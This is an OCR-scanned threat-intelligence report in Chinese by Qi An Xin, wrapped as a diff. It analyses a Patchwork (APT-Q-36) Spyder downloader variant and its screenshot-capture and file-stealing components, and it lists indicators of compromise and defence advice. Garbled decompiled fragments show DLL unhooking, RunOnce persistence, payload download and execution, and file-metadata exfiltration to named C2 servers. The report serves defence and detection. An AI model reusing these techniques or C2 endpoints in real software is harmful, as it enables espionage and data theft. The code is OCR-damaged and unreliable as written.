@@ -1,0 +1,337 @@
+# 摩诃草（APT-Q-36）Spyder下载器新变种及后续组件分析  
+
+原创威胁情报中心奇安信威胁情报中心2024年08月13日17:43北京  
+
+## ·团伙背景  
+
+摩诃草，又名 Patchwork、白象、Hangover、Dropping Elephant 等，奇安信内部跟踪编号APT-Q-36。该组织被普遍认为具有南亚地区背景，其最早攻击活动可追溯到2009年11月，已持续活跃10余年。该组织主要针对亚洲地区的国家进行网络间谍活动，攻击目标包括政府、军事、电力、工业、科研教育、外交和经济等领域的组织机构。  
+
+## 事件概述  
+
+奇安信威胁情报中心此前发布过关于摩诃草组织Spyder 下载器的分析报告[1,2]，近期我们发现Spyder 下载器出现新变种，并观察到攻击者借助Spyder下发两款窃密组件，分别用于截屏和收集文件信息。  
+
+虽然Spyder下载器的核心功能没变，仍是从远程下载的加密ZIP包中释放出后续组件并执行，但在代码结构和 C2 通信格式等方面做了一些改动。以下是本次发现的 Spyder 下载器和窃密组件的攻击过程。  
+
+  
+
+## 详细分析  
+
+相关样本信息如下：  
+
+
+<html><body><table><tr><td>MD5</td><td>编译时间</td><td>文件名</td><td>说明</td></tr><tr><td>689c91f532482aeff84c029be61f6 81a</td><td>2024-06-041 5:12:47 UTC</td><td>eac launcher.exe</td><td>Spyder下载器</td></tr><tr><td>7a177ef0b1ce6f03fa424becfb9d3 7ac</td><td>2024-05-21 0 8:28:54 UTC</td><td>IntelPieService.ex</td><td>截屏组件</td></tr><tr><td>85d0f615923af8196fa7d08ef1c68 b64</td><td>2024-02-131 0:46:07 UTC</td><td>RstMwService.ex</td><td>文件解密组件</td></tr></table></body></html>  
+
+### Spyder 下载器  
+
+样本689c91f532482aeff84c029be61f681a以Word文档图标作为伪装，程序带有数字签名。签名者名称为"Xi'an Qinxuntao Network Technology Co.，Ltd."，签名时间为 2024 年 6月 4 日15:21:35 UTC。  
+
+  
+
+新型Spyder下载器中的配置数据直接存放在代码中，不像之前的版本将其加密后保存在资源区。  
+
+9_struct_4c3670 $=$ (struct_Config \*)v15;   
+if (v15) lstrcpyA(&g_struct_4c3670->str_version,"0.0.0.1"); g_struct_4C3670->https_flag $=\overline{{\Theta}}$ lstrcpyw(&g_struct_4c3670->wstr_host, L"onlinecsstutorials.com"); lstrcpyw(&g_struct_4c3670->wstr_url_dir, L"/soup/"); lstrcpyw(&g_struct_4c3670->wstr_url_path,L"pencil.php"); lstrcpyw(&g_struct_4C3670->Wstr_mutex,L"HTyRkx9JKZV4Zghqpq5kwur22HR7GU9Z"); g_struct_4c3670->sleep_time $\l=$ 4000; LstrcpyA(&g_struct_4c3670->wstr_profile,"Fighter"); lpBuffer[1] $=$ (LPCVoID)lstrlenA(&g_struct_4C3670->str_version); g_version_encode $=$ Base64Encode((unsigned int)lpBuffer[1], &lpBuffer[1], (int)&g_struct_4C3670->str_version);  
+
+使用 curl 产生对 retail.googleapis.com 和 api.github.com 的网络通信，进行流量伪装。f（V18）  
+
+sub_409560((int)v18,10002,"https://retail.googleapis.com/\$discovery/rest?version=v2");   
+sub_409560((int)v20, 43,1);   
+sub_409560(（int)v20, 10005, "user:pass");   
+sub_409560((int)v20, 10018, "curl/7.42.0");   
+sub_409560(（int)v20, 68, 50);   
+sub_409560((int)v20, 213,1);   
+sub_4065F0((int)v20,2097154,(int)&hMem[1]);   
+sub_4065F0(（int)v20,3145731,（int)&v190);   
+sub_4065F0((int)v20,1048577,(int)&v184+4);  
+
+https://mp.weixin.qq.com/s/M6xoCfqMCSDsv32S0vrGEw  
+
+if（v1）  
+
+sub_409560((int)v1,10002,"https://api.github.com/repos/whoshuu/cpr/contributors?anon=true&key=value");   
+sub_409560((int)v2,43,1);   
+sub_409560((int)v2,10005,"user:pass");   
+sub_409560((int)v2,10018,"curl/7.42.0);   
+sub_409560((int)v2,68, 50);   
+sub_409560((int)v2,213, 1);   
+sub_4065Fo((int)v2,2097154,(int)v6);   
+sub_4065F0((int)v2, 3145731, (int)v5);   
+sub_4065F0((int)v2,1048577,(int)v4);   
+sub_406670(V2);  
+
+重新映射多个系统DLL的.text段，以解除对这些模块设置的挂钩。  
+
+  
+
+hProcess $=$ GetCurrentProcess();   
+memset(&modinfo,0, sizeof(modinfo));   
+hModule $=$ GetModuleHandlew(this);   
+if（!hModule） return -1;   
+memset(Buffer,O, sizeof(Buffer));   
+GetSystemDirectoryw(Buffer,Ox20oou);   
+lstrcatw(Buffer,&String2);   
+lstrcatw(Buffer,this);   
+if（!K32GetModuleInformation(hProcess，hModule，&modinfo，OxCu)) return -1;   
+LpBaseofDll $=$ modinfo.lpBaseofDll;   
+Lpstring2a $=$ (LPCWSTR)modinfo.lpBaseOfDLl;   
+hobject $=$ CreateFilew(Buffer,Ox8000000,1u,0,3u,0,0);   
+FileMappingw $=$ CreateFileMappingw(h0bject, 0, 0x1000002u, 0, 0,0);   
+$\vee3=$ (char \*)MapViewofFile(FileMappingw, 4u, 0, 0, 0);   
+v4 $=\odot$   
+$v5~=$ (IMAGE_NT_HEADERS \*)((char \*)lpBaseOfDLl $^+$ LpBase0fDll[15]);   
+v10 $=$ v3;   
+if (v5->FileHeader.NumberofSections)   
+{ do { V6 $=$ (IMAGE_SECTION_HEADER\*)（(char\*)&v5->OptionalHeader $^+$ 40 $\star$ V4 $^+$ v5->FileHeader.SizeOfoptionalHeader); if（1lstrcmpA((LPCSTR)v6,“.text"）） floldProtect $=\Theta$ ， VirtualProtect((char \*)lpstring2a $^+$ v6->VirtualAddress, v6->Misc.PhysicalAddress, 0x40u, &floldProtect); memmove(（char \*)lpstring2a $^+$ v6->VirtualAddress,&v10[v6->VirtualAddress],v6->Misc.PhysicalAddress); VirtualProtect((char \*)ipstring2a $^+$ v6->VirtualAddress, v6->Misc.PhysicalAddress, floldProtect, &floldProtec ++V4; while( $\lor4<\lor5$ ->FileHeader.NumberofSections );   
+CloseHandle(hProcess);   
+CloseHandle(hobject);   
+CloseHandle(FileMappingW);   
+FreeLibrary(hModule);   
+return 0;  
+
+样本设置多个只触发一次的计划任务，指向"%LocalAppdata%\zlib1.exe"，并将自身复制为"% LocalAppdata%\zlib1.exe"。  
+
+摩诃草（APT-Q-36）Spyder下载器新变种及后续组件分析  
+
+
+<html><body><table><tr><td colspan="4">zlibdatacompressionA zlib data compressionB zlib datacompression C</td><td colspan="2">准备就绪 在 准备就绪 准备就绪</td><td colspan="3">的14:00时 的15:00时 的16:00时</td></tr><tr><td colspan="4">zlibdatacompressionD zlib data compression E</td><td colspan="2">准备就绪 准备就绪</td><td>在在在在</td><td>的17:00时 的18:00时</td></tr><tr><td colspan="8"></td></tr><tr><td>常规</td><td>触发器</td><td>操作</td><td>条件</td><td>设置</td><td colspan="2">历史记录（已禁用）</td><td></td></tr><tr><td colspan="8">创建任务时，必须指定任务启动时发生的操作。若要更改这些操作，使用“属性”命令打开任务</td></tr><tr><td colspan="2">操作 详细信息</td><td colspan="8"></td></tr><tr><td colspan="2">启动程序</td><td colspan="8">CA\Users AppData\Local\zlib1.exe</td></tr><tr><td colspan="8"></td><td colspan="2"></td></tr></table></body></html>  
+
+样本与C2服务器的通信数据放在POST请求首部的自定义字段（该样本为"boop"）中，数据为经过Base64编码的JSON字符串，Base64编码后还会对部分字符进行替换处理。  
+
+10 dwNumberofBytesRead=0;   
+11 hMem $\Bumpeq$ (CHAR\*)GLobalALLoc(Ox40u,2\*arg_sz);   
+12 v8 $=$ Internetopenw(   
+13 LMozilla/5.0（Macintosh;Intel Mac 0sX 10_15_7) AppleWebKit/537.36（KHTML,like Gecko)Chrome/104.0.5112.79 Safari/537.36",   
+14 1u,   
+15 0，   
+16   
+17 0);   
+18 hInternet $=$ InternetConnectw(v8,&g_struct_4c3670->wstr_host,0x50u,0,0,3u,0,0);   
+19 v4=HttpOpenRequestW（hInternet,L"PosT",&g_url,0,0,0,0,0);   
+20 wsprintfA（hMem,"boop:%s\r\n",arg_content);   
+21 HttpAddRequestHeadersA(v4,hMem,0xFFFF,OxA000ooo0);   
+22 tf ( IHttpSendRequestW(v4, 0, 0, 0, 0) )   
+23 return 1;   
+24 v6=1;   
+25 if(InternetReadFile(v4，arg_recv_buf,0x40ou，&dwNumberofBytesRead))   
+26 v6 = 17;   
+27 InternetcloseHandle(v4);   
+28 InternetCloseHandle(hInternet);   
+29 InternetCloseHandle(v8);   
+30 GlobaLFree(hMen);   
+31 return v6;  
+
+POST/soup/pencil.phpHTTP/1.1   
+boop:eyJ4ZG11 1BR1F   
+BI fQ--   
+User-Agent:Mozilla/5.0(Macintosh;Inte1 Mac 0SX10_15_7) AppleWebKit/537.36(KHTML,1ike Gecko) Chrome/104.0.5112.79 Safari/537.36   
+Host: onlinecsstutorials.com   
+Content-Length:0   
+Cache-Control:no-cache   
+for(result $=\textcircled{-}$ :result $\ll$ a2;++result   
+f v4=\*（_BYTE \*)（a1+result); switch（v4) case \*（_BYTE \*)（a1 +result）= break; case \*（_BYTE \*)(a1 +result) break; case $^1={}^{\circ}$ \*（_BYTE \*)（a1+result）= break;   
+7  
+
+样本向C2 服务器的"/soup/pencil.php”发送的JSON字符串包含两部分固定的内容，分别是："xdid"（感染设备的MachineGUID）和"about"（样本配置数据中的字符串“O.0.0.1"，可能是版本号）。  
+
+摩诃草（APT-Q-36）Spyder下载器新变种及后续组件分析  
+
+
+<html><body><table><tr><td>地址</td><td>ASCII</td></tr><tr><td>01245D78</td><td>Xdid:"NQAOAD LGI</td></tr><tr><td>01245DB8</td><td rowspan="2">AN about":"MC4wLiAuMQ--</td></tr><tr><td>01245DF8</td></tr><tr><td></td><td>D5.a'#.1.6 -..-...P#%.Hi$..S.c.r.i.D.t.s</td></tr></table></body></html>  
+
+向"/soup/pencil.php"发送请求主要有两个作用：  
+
+（1）是否收集设备信息；  
+（2）获取关于后续组件压缩包的信息。  
+
+### 收集设备信息  
+
+样本根据第一次请求C2服务器"/soup/pencil.php"的响应判断是否需要收集设备信息并回传，如果响应为"1"，则执行信息收集操作，否则跳过该步骤。收集的信息添加为JSON 字符串中的jupiter字段。  
+
+  
+
+收集的各类信息如下：  
+
+
+<html><body><table><tr><td colspan="2">字段名称 保存数据</td></tr><tr><td>address</td><td>主机名</td></tr><tr><td>pageid</td><td>用户名</td></tr><tr><td>weather</td><td>操作系统版本</td></tr><tr><td>profile</td><td>样本配置数据中的字符串（"Fighter"）</td></tr><tr><td>news</td><td>安装的杀毒软件信息</td></tr></table></body></html>  
+
+### 下载后续组件  
+
+之后样本进入获取后续组件的循环过程。每次循环先向 api.github.com 发送伪装流量，然后请求C2 服务器"/soup/pencil.php"。如果响应为“0"，或响应数据长度不大于5，则直接休眠等待下一次循环。  
+
+当响应数据符合要求时，样本从中提取关于压缩包的信息，用于下载后续组件。在响应数据中提取信息的字段有如下3个：  
+
+<html><body><table><tr><td>字段名称</td><td>说明</td></tr><tr><td>first</td><td>下载组件的类别 (数字)</td></tr><tr><td>middle</td><td>下载压缩包的名称（字符串）</td></tr><tr><td>last</td><td>解密压缩包的密码（字符串）</td></tr></table></body></html>  
+
+样本将 middle 字段内容拼接到"/soup/download.php?mname $=$ ”之后，向C2服务器发起请求，下载包含后续组件的ZIP压缩包。  
+
+  
+
+  
+
+压缩包中的组件解压到INTERNET_CACHE 目录（即"C:\Users\[user_name]\AppData\Local\Microsoft\Windows\INetCache\"），然后调用 CreateProcessW 执行。  
+
+var_exec_path $\dot{=}$ （WCHAR\*)GlobalAlloc(0x40u，2\*v20+1024);   
+wsprintfW(var_exec_path,L"%s\%hs",&folder_INTERNET_CACHE,v35);   
+v22=CreateFileW(var_exec_path，0x10000000u,1u,0,2u,0x80u,0);   
+WriteFile(v22,v27,v18,&Number0fBytesWritten,0);   
+CloseHandle(v22);   
+StartupInfo.cb $=~68$ memset(&StartupInfo.wshowWindow,0, 20);   
+memset(&StartupInfo.LpReserved,0, 40);   
+StartupInfo.dwFlags $=~1$ CreateProcessW（var_exec_path,0,0,0,1,θx8oooooou,0,0，&StartupInfo,&ProcessInformation);   
+GlobaLFree(var_exec_path);   
+GlobalFree(v27);  
+
+### 后续组件  
+
+目前观察到通过上述 Spyder 下载器释放的后续组件有两类，均带有与Spyder 下载器相同的数字签名（"Xi'an Qinxuntao NetworkTechnologyCo.，Ltd."），主要功能分别为截屏回传和  
+
+文件信息窃密。  
+
+#### 组件一：截屏  
+
+截屏组件 IntelPieService.exe 将截屏保存为 image.bmp，回传到 hxxp://onlinecsstutorials[.]com/soup/upsman.php.  
+
+  
+
+#### 发送的请求数据中仍以设备的 Machine GUID 作 为 uid。  
+
+  
+
+#### 组件二：文件窃密  
+
+文件窃密组件 RstMwService.exe 首先将自身文件路径设置为注册表中当前用户 RunOnce 项下DeviceDisplay的数据。  
+
+memset(Filename,0,sizeof(Filename));   
+GetModuleFileNameW(0,Filename,Ox20oou);   
+RegCreateKeyW_ptr(HKEY_cURRENT_USER,L"SoFTWARE\\Microsoft\\Windows\ICurrentVersion\\RunOnce",v63);   
+$\vee45=$ Lstrlenw(Filename);   
+RegSetValueExW_ptr(v63[0],L"DeviceDisplay",θ,1,Filename,2\*v45);   
+RegCloseKey_ptr(v63[0]);  
+
+https://mp.weixin.qq.com/s/M6xoCfqMCSDsv32S0vrGEw  
+
+从资源区释放文件，保存为INTERNET_CACHE 目录下的 MsEngLU.dll（MD5：c568d613ba74fd6cd5da730f6ce38626)。  
+
+  
+
+#### 最后加载 MsEngLU.dll，调用导出函数 DriveBackup。  
+
+  
+
+MsEngLU.dll带有数字签名"GJT AUTOMOTIVELTD"。  
+
+  
+摩诃草（APT-Q-36）Spyder下载器新变种及后续组件分析  
+
+该 DLL 从用户的 Desktop、Documents、Downloads、OneDrive 子目录，以及所有非系统盘的根目录开始递归收集文件信息。  
+
+SHGetKnownFolderPath（&stru_101223E0,0,0,（PWSTR\*)&var_folder_Desktop);//"%USERPR0FILE%\Desktop" SHGetKnownFolderPath(&stru_10122400,0,0,&var_folder_Documents);// "%USERPR0FILE%\Documents" SHGetKnownFolderPath(&stru_10122410,0,0,&var_folder_Downloads);// "%USERPR0FILE%\Downloads" SHGetKnownFolderPath(&stru_101223F0,0,0,&var_folder_SkyDrive);//"%USERPROFILE%\OneDrive"   
+CollectFileInfo(var_folder_Desktop);   
+CollectFileInfo(var_folder_Documents);   
+CollectFileInfo(var_folder_Downloads);   
+CollectFileInfo(var_folder_SkyDrive);   
+\*(_DWORD \*)RootPathName $\angle=\because\angle O A$   
+$v22=\mathrm{~\rho~}^{\prime}11$   
+sub_10102260（(int)Buffer,0,520);   
+GetWindowsDirectoryw(Buffer,Ox208u);   
+DriveNumberw $=$ PathGetDriveNumberW(Buffer);   
+system_drive $=$ (WCHAR \*)GlobalAlloc(Ox4Ou, 0xAu);   
+PathBuildRootW(system_drive,DriveNumberW);   
+RootPathName[0] $\begin{array}{r l}{{\bf\Psi}}&{{}={\bf\Psi}}\ {{\bf\Psi}}&{{}={\bf\Psi}}\end{array}\begin{array}{r l}{{\bf\Psi}}&{{}\bullet{\bf\Psi}}\ {{\bf{A}}}&{{}}\end{array}$   
+do   
+V10 $=$ GetDriveTypeW(RootPathName)-2;   
+if（（!v101lv10 $\scriptstyle==1$ ）&&lstrcmpW(system_drive,RootPathName）)// 2:DRIVE_REMOVABLE;3:DRIVE_FIXED CollectFileInfo(RootPathName);   
+++RootPathName[0];   
+while ( (unsigned int)RootPathName[0] $\mathbf{\Sigma}\quad\mathbf{\Sigma}<=\mathbf{\Sigma}^{\prime}\mathbf{\Sigma}^{\prime}\mathbf{Z}^{\prime}$ );  
+
+窃密软件关注的文件类型包括文档、压缩包、图片、音频、电子邮件。  
+
+if（lstrcmpw（FindFileData.cFileName,L".") &&lstrcmpW(FindFileData.cFileName,L". $v3=$ lstrlenw(v1); $\lor4=$ lstrlenw(FindFileData.cFileName); $v5~=$ (WCHAR \*)GlobaLAlloc(0x40u, $2^{\star}(\vee4+\vee3)+128);$ PathCombineW(v5,this, FindFileData.cFileName); if（（FindFileData.dwFileAttributes & Ox10) $\mathfrak{\xi}=~\Theta$ CollectFileInfo(v5); 1 else { Extensionw $=$ PathFindExtensionw(v5); if（!lstrcmpw(ExtensionW,L".pdf")) sub_1000135o(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw(Extenstonw,L".doc")) sub_10001350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（Ilstrcmpw（Extensionw,L".docx"）） sub_10o01350(v5, FindFileData.ftLastWriteTime.dwLowDateTime); if（lstrcmpw（Extenstonw，Lxls)) sub_10001350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw（Extensionw,L".xlsx"）） sub_10001350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw（Extensionw,L.ppt"）） sub_1000135o(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw（Extensionw,L".pptx"）) sub_10001350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw（Extensionw,L.zip")） sub_10001350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw(Extensionw,L".png"）） sub_1000135o(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw（Extensionw，L.jpeg"）) sub_10001350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw(Extensionw,L".opus")) sub_10o01350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw(Extensionw,L".ogg")) sub_10o01350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw(Extensionw,L".eml")) sub_10001350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); if（!lstrcmpw(Extensionw,L".rar")) sub_10001350(v5,FindFileData.ftLastWriteTime.dwLowDateTime); FirstFileW =v9;  
+
+文件信息存放在 SQLite 格式的本地数据库"%APPDATA%\Microsoft\Windows\Libraries\policy.db"中。  
+
+  
+
+最后将数据回传到"hxxp://93.95.230.16/domcomtwit/hen.php"。  
+
+  
+
+## ·溯源关联  
+
+本次发现的 Spyder 变种仍具有以往 Spyder 样本[1,2l的诸多特征，包括：XOR 解密字符串;设置多个计划任务；以JSON字符串格式组织通信数据；先从C2服务器获取加密压缩包信息再下载压缩包并解密等。  
+
+该 Spyder 变种关联到一些相似的样本，从程序创建时间可以看出此类变种至少从 3 月份开始投入使用。  
+
+<html><body><table><tr><td>MD5</td><td>编译时间</td><td>C&C</td></tr><tr><td>887d76e305d1b2ac22a83a1418a9fc 57</td><td>2024-03-1414:47:01UTC</td><td>10p1.shop</td></tr><tr><td>47b4ed92cfc369dd11861862d377ae 26</td><td>2024-04-0514:09:32 UTC</td><td>firebaseupdater.com</td></tr><tr><td>0dc0816bd46f3fe696ed0a2f1b67cfa 8</td><td>2024-04-25 17:10:20 UTC</td><td>firebaseupdater.com</td></tr><tr><td>e8a9b75c5e41f6d4af9f32c11d0057c b</td><td>2024-04-25 17:10:20 UTC</td><td>firebaseupdater.com</td></tr></table></body></html>  
+
+lstrcpyA(&g_struct_4C4668->str_version,"0.0.θ.1");   
+V19 $=$ g_struct_4c4668;   
+v11 $=$ lstrcpyw;   
+g_struct_4C4668->dword14=0;   
+lstrcpyw((LPWSTR)v19->wstr_host,L"lop1.shop");   
+lstrcpyw(&g_struct_4c4668->wstr_url_dir,L"/ares/");   
+lstrcpyw(&g_struct_4c4668->wstr_url_path,L"pencil.php");   
+lstrcpyw(&g_struct_4C4668->wstr_mutex,L"na0U3bTZqsHR0FIe");   
+v20 =g_struct_4c4668;   
+g_struct_4c4668->sleep_time $=$ 4000;   
+lstrcpyA((LPSTR)&v20->Char69C,"ZXF"); lstrcpyA(（LPSTR)（dword_458180+4)."1.0.0.1");   
+\*（_DW0RD\*)（dword_458180+20) $=0$ lstrcpyW((LPWSTR)(dword_458180 $^+$ 24).L"firebaseupdater.com");   
+lstrcpyW(（LPWSTR)(dword_458180 $^+$ 536),L"/gandalf/");   
+lstrcpyW((LPWSTR)(dword_458180 $^{+}$ 1048),L"cane.php");   
+lstrcpyW(（LPWSTR)(dword_458180+1564）,L"yXXUKLWPEKQWohto");   
+\*（_DW0RD \*)（dword_458180 +1560) $=$ 4000;   
+v112 $=$ lstrlenA(（LPCSTR)（dword_458180+ 4));  
+
+根据RstMwService.exe 释放的 MsEngLU.dll可以关联到另一个相同的文件窃密软件（MD5：339ce8f7b5f253f2397fc117f6503f1f），回传文件信息的 URL 为"hxxp://89.147.109.143/lightway/hex.php"。  
+
+if（v14） sub_10002CB0(v19,&v18, "compnane" 4,dword_1014E8D0,17); sub_10002CB0(v19,&v18，1, "username", 4, dword_1014E8cc, 17); V6 $=$ lpFileName; $v7=$ lstrlenw(LpFileName); lpstringa $=$ (WCHAR\*)sub_10001040(lpFileName,2\*v7); sub_10002cB0(v19,&v18,1,“filepath",4,lpStringa,17); FileNamew $=$ PathFindFileNameW(v6); v9 $=$ lstrlenW(FileNameW); V10 $=$ (void\*)sub_10001040（FileNameW,2\*v9); sub_10002CB0（v19,&v18,1,“KMvBwHSvKAVckJhn",12,v4, 13,v15,16,v10,14,"application/octet-strean",17); sub_10007380(v14,10002,(char)"http://89.147.109.143/lightway/hex.php"); sub_10007380(v14,47,1); sub_10007380(v14, 10024,v19[0]); v11 =sub_10001F40(v14); if（v11) V13 $=$ sub_10003510(v11); V12 $\l=$ sub_10104CDA(2); sub_10001010(v12,"curl_easy_perform() failed:%s\n",v13); sub_10001EC0(v14); sub_10002CD0(v19[0]); sub_101075D4(lpStringa); sub_101075D4(V10);  
+
+释放该窃密软件的样本（MD5：e19e53371090b6bd0e1d3c33523ad665）同样将其保存为INTERNET_CACHE 目录下的 MsEngLU.dIl 文件，并调用其导出函数 DriveBackup。  
+
+  
+
+# 1总结  
+
+Spyder的再度更新表明该下载器已经成为摩诃草组织的一款常用工具。两款窃密组件分开下载，并执行不同的功能，体现出攻击者武器库的模块化结构。目前捕获到的后续组件功能为截屏和文件信息收集，很可能只是下发载荷种类的冰山一角，因为攻击者完全可以根据收集的信息有选择性地对高价值目标采取进一步行动。  
+
+## ·防护建议  
+
+奇安信威胁情报中心提醒广大用户，谨防钓鱼攻击，切勿打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行标题夸张的未知文件，不安装非正规途径来源的APP。做到及时备份重要文件，更新安装补丁。  
+
+若需运行，安装来历不明的应用，可先通过奇安信威胁情报文件深度分析平台（https://sandbox.ti.qianxin.com/sandbox/page）进行判别。目前已支持包括Windows、安卓平台在内的多种  
+
+格式文件深度分析。  
+
+目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  
+
+#  
+
+### MD5:  
+
+689c91f532482aeff84c029be61f681a 887d76e305d1b2ac22a83a1418a9fc57 47b4ed92cfc369dd11861862d377ae26 0dc0816bd46f3fe696ed0a2f1b67cfa8 e8a9b75c5e41f6d4af9f32c11d0057cb 7a177ef0b1ce6f03fa424becfb9d37ac 85d0f615923af8196fa7d08ef1c68b64 e19e53371090b6bd0e1d3c33523ad665 c568d613ba74fd6cd5da730f6ce38626 339ce8f7b5f253f2397fc117f6503f1f  
+
+C&C:   
+onlinecsstutorials.com   
+10p1.shop   
+firebaseupdater.com   
+93.95.230.16:80   
+89.147.109.143:80   
+URL:   
+hxxp://onlinecsstutorials.com/soup/pencil.php   
+hxxp://onlinecsstutorials.com/soup/download.php?mname $=$   
+hxxp://onlinecsstutorials.com/soup/upsman.php   
+hxxp://l0p1.shop/ares/pencil.php   
+hxxp://10p1.shop/ares/download.php?mname $=$   
+hxxp://firebaseupdater.com/gandalf/cane.php   
+hxxp://firebaseupdater.com/gandalf/download.php?mname $=$   
+hxxp://93.95.230.16/domcomtwit/hen.php   
+hxxp://89.147.109.143/lightway/hex.php  
+
+## ■参考链接  
+
+[1].https://ti.qianxin.com/blog/articles/Suspected-Patchwork-Utilizing-WarHawk-Back door-Variant-Spyder-for-Espionage-on-Multiple-Nations-CN/   
+[2].https://ti.qianxin.com/blog/articles/Delivery-of-Remcos-Trojan-by-Mahaccha-Grou p-APT-Q-36-Leveraging-Spyder-Downloader-CN/  
+
+  
+
+点击阅读原文至ALPHA7.0 即刻助力威胁研判  
